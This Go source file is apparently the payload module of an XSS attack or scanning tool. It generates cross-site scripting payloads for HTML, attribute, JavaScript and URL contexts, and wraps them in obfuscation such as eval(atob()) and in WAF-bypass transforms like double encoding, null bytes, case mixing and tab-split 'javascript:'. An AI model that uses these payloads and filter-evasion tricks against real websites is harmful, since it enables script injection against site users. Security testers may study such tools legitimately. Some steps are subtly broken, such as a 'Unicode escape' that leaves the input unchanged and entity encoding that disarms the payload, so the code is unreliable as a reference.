package generator

import (
	"encoding/base64"
	"fmt"
	"strings"
)

type PayloadConfig struct {
	EnableObfuscation bool
	EnableWAFBypass   bool
	CustomPayloads    []string
	Context           string // html, attr, js, url
}

type Generator struct {
	config PayloadConfig
}

func NewGenerator(cfg PayloadConfig) *Generator {
	return &Generator{
		config: cfg,
	}
}

// GeneratePayloads creates context-aware XSS payloads
func (g *Generator) GeneratePayloads(context string) []string {
	var payloads []string

	// Add custom payloads if provided
	if len(g.config.CustomPayloads) > 0 {
		payloads = append(payloads, g.config.CustomPayloads...)
	}

	// Add context-specific payloads
	contextPayloads := g.getContextPayloads(context)
	payloads = append(payloads, contextPayloads...)

	// Apply obfuscation if enabled
	if g.config.EnableObfuscation {
		payloads = g.obfuscatePayloads(payloads)
	}

	// Apply WAF bypass techniques if enabled
	if g.config.EnableWAFBypass {
		payloads = g.applyWAFBypass(payloads)
	}

	return payloads
}

func (g *Generator) getContextPayloads(context string) []string {
	switch strings.ToLower(context) {
	case "html":
		return []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
		}
	case "attr":
		return []string{
			"\" onmouseover=\"alert(1)",
			"' onclick='alert(1)",
			"javascript:alert(1)",
		}
	case "js":
		return []string{
			"';alert(1);//",
			"\";alert(1);//",
			"\\';alert(1);//",
		}
	case "url":
		return []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
			"vbscript:alert(1)",
		}
	default:
		return []string{
			"<script>alert(1)</script>",
			"\"><script>alert(1)</script>",
			"'><script>alert(1)</script>",
		}
	}
}

func (g *Generator) obfuscatePayloads(payloads []string) []string {
	var obfuscated []string

	for _, payload := range payloads {
		// HTML entity encoding
		encoded := strings.ReplaceAll(payload, "<", "&lt;")
		encoded = strings.ReplaceAll(encoded, ">", "&gt;")
		obfuscated = append(obfuscated, encoded)

		// Base64 encoding
		b64 := base64.StdEncoding.EncodeToString([]byte(payload))
		obfuscated = append(obfuscated, fmt.Sprintf("<script>eval(atob('%s'))</script>", b64))

		// Unicode escape sequence
		unicode := strings.Map(func(r rune) rune {
			return r
		}, payload)
		obfuscated = append(obfuscated, unicode)

		// URL encoding
		urlEncoded := strings.ReplaceAll(payload, "<", "%3C")
		urlEncoded = strings.ReplaceAll(urlEncoded, ">", "%3E")
		urlEncoded = strings.ReplaceAll(urlEncoded, "\"", "%22")
		urlEncoded = strings.ReplaceAll(urlEncoded, "'", "%27")
		obfuscated = append(obfuscated, urlEncoded)
	}

	return obfuscated
}

func (g *Generator) applyWAFBypass(payloads []string) []string {
	var bypassed []string

	for _, payload := range payloads {
		// Case variation
		bypassed = append(bypassed, strings.ReplaceAll(payload, "script", "ScRiPt"))

		// Double encoding
		doubleEncoded := strings.ReplaceAll(payload, "<", "%253C")
		doubleEncoded = strings.ReplaceAll(doubleEncoded, ">", "%253E")
		bypassed = append(bypassed, doubleEncoded)

		// Null byte injection
		bypassed = append(bypassed, strings.ReplaceAll(payload, "<", "<\x00"))

		// Alternative tags
		bypassed = append(bypassed, strings.ReplaceAll(payload, "<script", "<svg/onload"))

		// Protocol bypass
		bypassed = append(bypassed, strings.ReplaceAll(payload, "javascript:", "java&#09;script:"))
	}

	return bypassed
}

// AddCustomPayload allows adding new custom payloads at runtime
func (g *Generator) AddCustomPayload(payload string) {
	g.config.CustomPayloads = append(g.config.CustomPayloads, payload)
}

// SetContext updates the context for payload generation
func (g *Generator) SetContext(context string) {
	g.config.Context = context
}

// EnableWAFBypass enables WAF bypass techniques
func (g *Generator) EnableWAFBypass(enable bool) {
	g.config.EnableWAFBypass = enable
}

// EnableObfuscation enables payload obfuscation
func (g *Generator) EnableObfuscation(enable bool) {
	g.config.EnableObfuscation = enable
}
